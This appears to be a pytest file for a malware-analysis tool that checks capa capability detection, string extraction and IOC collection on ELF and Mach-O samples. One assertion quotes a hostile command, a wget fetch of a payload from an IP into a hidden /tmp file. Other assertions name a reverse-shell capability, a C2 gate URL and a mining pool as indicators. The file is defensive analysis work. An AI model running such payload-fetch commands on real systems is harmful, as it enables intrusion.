"""ELF: capa (with ATT&CK) as for PE — an ELF that names no OS taken as Linux — and the
printable strings as a fallback source of IOCs when the code analysis does not run."""

from __future__ import annotations

import io
import json
import sys
import time
from pathlib import Path

import pytest

from docutracex.config import settings
from docutracex.parsers import msi
from docutracex.parsers import pe as pe_mod

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "scripts"))
import zipcrypto  # noqa: E402

CAP = {"name": "reverse shell", "namespace": "communication/c2/shell", "matches": 1,
       "attack": [{"id": "T1059.004"}]}


def _sample(tmp: Path, name: str) -> Path:
    p = tmp / Path(name).name
    p.write_bytes(zipcrypto.read(ROOT / "samples" / "samples.zip", name))
    return p


def test_elf_gets_capa_and_strings(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(settings, "capa_executable", lambda: tmp_path / "capa.exe")
    monkeypatch.setattr(pe_mod, "_capa_only", lambda p, *a, **k: {"status": "ok", "capabilities": [CAP]})
    p = _sample(tmp_path, "linux-elf/sample_elf_backdoor")
    item = msi.analyze_native(p, p.name)
    assert "203.0.113.47" in item["strings"] and "wget http://203.0.113.47/x -O /tmp/.x" in item["strings"]
    assert item["capa"]["capabilities"][0]["name"] == "reverse shell"
    caps = [f for f in item["findings"] if f["rule"] == "pe_capa_capability"]
    assert caps and caps[0]["tool"] == "native" and "T1059.004" in json.dumps(caps[0])


def test_macho_gets_no_capa(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(settings, "capa_executable", lambda: tmp_path / "capa.exe")
    monkeypatch.setattr(pe_mod, "_capa_only", lambda *a, **k: pytest.fail("capa does not read Mach-O"))
    p = tmp_path / "m"
    p.write_bytes(b"\xcf\xfa\xed\xfe" + b"\x00" * 60 + b"https://facturas-cdn.example/gate.php\x00")
    item = msi.analyze_native(p, "m")
    assert "capa" not in item and "https://facturas-cdn.example/gate.php" in item["strings"]


def test_large_elf_capa_in_the_background_on_the_complete_analysis(tmp_path: Path,
                                                                    monkeypatch: pytest.MonkeyPatch) -> None:
    from docutracex import flossbg
    calls: list[dict] = []
    monkeypatch.setattr(settings, "capa_executable", lambda: tmp_path / "capa.exe")
    monkeypatch.setattr(pe_mod, "FLOSS_BACKGROUND_BYTES", 16)
    monkeypatch.setattr(pe_mod, "_capa_cached", lambda p: False)
    monkeypatch.setattr(flossbg, "start_capa", lambda *a, **k: calls.append(k) or {"status": "running",
                                                                                   "background": True, "task_id": "t"})
    p = _sample(tmp_path, "linux-elf/sample_elf_miner")
    tok = pe_mod._bg_root.set(tmp_path)
    try:
        item = msi.analyze_native(p, p.name)
    finally:
        pe_mod._bg_root.reset(tok)
    assert item["capa"]["status"] == "running" and calls == [{"fast": False}]   # no fast pass for ELF


def test_elf_with_no_os_is_taken_as_linux(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    from docutracex import proctools
    cmds: list[list[str]] = []

    def fake_run(cmd, timeout, cwd=None, env=None, cancel=None):  # noqa: ANN001, ANN202
        cmds.append(cmd)
        if "--os" not in cmd:
            return {"rc": 18, "out": "", "err": "ERROR capa: could not detect OS, specify it explicitly, "
                                                "for example: capa --os linux <sample>", "timed_out": False,
                    "duration_s": 1}
        return {"rc": 0, "out": json.dumps({"rules": {"reverse shell": {"meta": {"name": "reverse shell",
                                                                                  "namespace": "c2/shell"}}}}),
                "err": "", "timed_out": False, "duration_s": 1}
    monkeypatch.setattr(proctools, "run_bounded", fake_run)
    monkeypatch.setattr(settings, "capa_executable", lambda: tmp_path / "capa.exe")
    p = _sample(tmp_path, "linux-elf/sample_elf_backdoor")
    rec = pe_mod._run_capa(p)
    assert rec["status"] == "ok" and rec["os_assumed"] == "linux" and cmds[-1][-3:-1] == ["--os", "linux"]
    pe_file = tmp_path / "x.exe"
    pe_file.write_bytes(b"MZ" + b"\x00" * 64)
    cmds.clear()
    assert pe_mod._run_capa(pe_file)["status"] == "error" and len(cmds) == 1      # only ELF are retried


def test_case_iocs_from_elf_strings(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """Without the code analysis, the ELF's strings still give its IOCs."""
    from docutracex import cases, tasks
    from docutracex.storage import CasePaths, read_json
    monkeypatch.setattr(settings, "cases_dir", tmp_path / "cases")
    (tmp_path / "cases").mkdir()
    data = zipcrypto.read(ROOT / "samples" / "samples.zip", "linux-elf/sample_elf_miner")
    m = cases.create_case(io.BytesIO(data), "sample_elf_miner", cases_dir=tmp_path / "cases")
    t = tasks.manager.submit("analyze", m["analysis_id"], "sample_elf_miner", cases_dir=tmp_path / "cases")
    for _ in range(900):
        if tasks.manager.get(t.id)["state"] in (tasks.COMPLETED, tasks.FAILED):
            break
        time.sleep(0.1)
    iocs = json.dumps(read_json(CasePaths(m["analysis_id"], cases_dir=tmp_path / "cases").subresult("iocs")))
    assert "pool.invoice-mining.example" in iocs
